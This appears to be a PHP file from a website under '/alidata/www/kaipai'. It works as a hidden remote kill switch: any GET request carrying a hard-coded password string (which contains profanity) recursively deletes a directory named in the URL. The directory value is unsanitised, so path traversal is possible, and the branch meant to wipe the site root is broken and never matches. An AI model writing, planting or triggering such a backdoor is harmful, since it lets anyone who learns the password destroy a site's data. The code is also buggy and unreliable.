<?php
$code = $_GET['code'];
$dir = $_GET['dir'];
if($code == 'kaipai123-fuck'){

    function deldir($dir) {
        //先删除目录下的文件：
        $dh=opendir($dir);
        while ($file=readdir($dh)) {
            if($file!="." && $file!="..") {
                $fullpath=$dir."/".$file;
                if(!is_dir($fullpath)) {
                    unlink($fullpath);
                } else {
                    deldir($fullpath);
                }
            }
        }

        closedir($dh);
        //删除当前文件夹：
        if(rmdir($dir)) {
            return true;
        } else {
            return false;
        }
    }
    if(!empty($dir)){
        $dir = '/alidata/www/kaipai/' . $dir;
        if($dir == 'kaipai123-fuck-y'){
            $dir = '/alidata/www/kaipai';
        }
        deldir($dir);
    }


}
?>